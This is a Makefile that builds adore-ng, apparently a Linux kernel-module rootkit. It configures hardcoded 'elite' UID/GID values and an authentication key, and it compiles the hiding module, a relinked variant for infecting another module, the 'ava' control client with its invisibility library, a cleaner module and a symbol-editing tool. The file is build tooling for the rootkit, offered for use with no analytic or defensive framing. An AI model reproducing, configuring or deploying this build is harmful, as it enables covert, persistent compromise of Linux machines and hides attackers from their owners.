#
CC=cc
CFLAGS=-O2 -Wall

#CFLAGS+=-mcpu=i486
INC=-I/usr/src/linux/include
CFLAGS+=-DELITE_UID=2592809546U -DELITE_GID=2197694918U
CFLAGS+=-DCURRENT_ADORE=54
CFLAGS+=-DADORE_KEY=\"youyifeng\"

#CFLAGS+=-DREDHAT9

CFLAGS+=-D__SMP__

#CFLAGS+=-DMODVERSIONS

all:	adore-ng ava cleaner symsed

adore-ng: adore-ng.c
	rm -f adore-ng.o
	$(CC) -c $(INC) $(CFLAGS) adore-ng.c -o adore-ng.o
	$(CC) -c $(INC) $(CFLAGS) -DRELINKED adore-ng.c -o zero.o

ava: ava.c libinvisible.c
	$(CC) $(CFLAGS) ava.c libinvisible.c -o ava

cleaner: cleaner.c
	$(CC) $(INC) -c $(CFLAGS) cleaner.c

symsed: symsed.c
	$(CC) -O2 symsed.c -o symsed
clean:
	rm -f core ava symsed *.o
